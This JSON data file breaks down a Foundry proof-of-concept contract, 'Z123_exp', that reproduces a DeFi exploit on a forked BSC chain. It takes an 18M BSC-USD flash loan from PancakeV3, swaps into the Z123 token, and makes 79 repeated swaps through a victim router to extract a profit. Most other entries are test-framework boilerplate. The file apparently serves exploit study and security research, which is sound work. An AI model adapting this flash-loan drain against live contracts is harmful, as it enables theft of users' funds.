[
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {\n        address[] memory path = new address[](2);\n        path[0] = address(bsc_usd_);\n        path[1] = address(z123_);\n        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            18_000_000 ether, 1, path, address(this), block.timestamp\n        );\n\n        console.log(\"==== start attack====\");\n        path[0] = address(z123_);\n        path[1] = address(bsc_usd_);\n        for (int256 i = 0; i < 79; i++) {\n            victim_.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                7125 ether, 1, path, address(this), block.timestamp\n            );\n        }\n        console.log(\"==== end attack====\");\n\n        //repay\n        bsc_usd_.transfer(address(pancakeV3_), 18_000_000 ether + fee0);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 38_077_210);\n\n        bsc_usd_.approve(address(router_), type(uint256).max);\n        z123_.approve(address(router_), type(uint256).max);\n\n        bsc_usd_.approve(address(victim_), type(uint256).max);\n        z123_.approve(address(victim_), type(uint256).max);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Z123_exp",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"befor ack usdc balance = \", bsc_usd_.balanceOf(address(this)), bsc_usd_.decimals());\n        pancakeV3_.flash(address(this), 18_000_000 ether, 0, \"\");\n        emit log_named_decimal_uint(\n            \"after profit usdc balance = \", bsc_usd_.balanceOf(address(this)), bsc_usd_.decimals()\n        );\n    }\n\n",
    "description": ""
  }
]